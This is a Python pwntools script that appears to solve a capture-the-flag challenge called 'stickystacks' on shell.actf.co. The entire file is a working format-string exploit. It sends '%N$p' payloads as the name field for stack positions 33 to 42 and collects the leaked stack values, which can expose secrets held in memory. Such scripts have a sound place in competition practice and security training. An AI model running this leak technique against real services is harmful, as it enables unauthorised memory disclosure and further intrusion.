#!/usr/bin/env python


from pwn import *
import binascii

BINARY = "./stickystacks"
ADDR = "shell.actf.co"
PORT = "21820"

splash()
elf = context.binary = ELF(BINARY)

STACK = {}


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def leak_stack(position):
    global STACK
    io = conn()

    offset = "%" + str(position) + "$p"
    io.sendlineafter("Name: \n", offset)
    io.recvuntil("Welcome, ")
    stack_leak = io.recvuntil("\n")[:-1]
    STACK[offset] = stack_leak

    io.close()


if __name__ == "__main__":
    for i in range(33, 43):
        leak_stack(i)

    for key, value in sorted(STACK.items()):
        print(key, value)
